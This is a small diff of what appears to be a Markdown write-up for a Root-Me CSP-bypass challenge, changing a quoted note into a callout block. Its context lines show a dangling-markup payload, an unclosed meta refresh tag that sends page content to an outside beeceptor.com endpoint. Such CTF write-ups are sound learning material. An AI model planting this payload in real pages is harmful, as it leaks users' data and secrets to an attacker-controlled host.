@@ -41,7 +41,9 @@ Using payload like following should work, but it's not working in browser.
 <meta http-equiv='refresh' content='0;https://uwuos.free.beeceptor.com?
 ```
 
-> **Note**: You have to play around with quotes
+::: info Note
+You have to play around with quotes
+:::
 
 ![csp-bypass-dangling-markup-3.png](/assets/ctf/root-me/csp-bypass-dangling-markup-3.png)
 
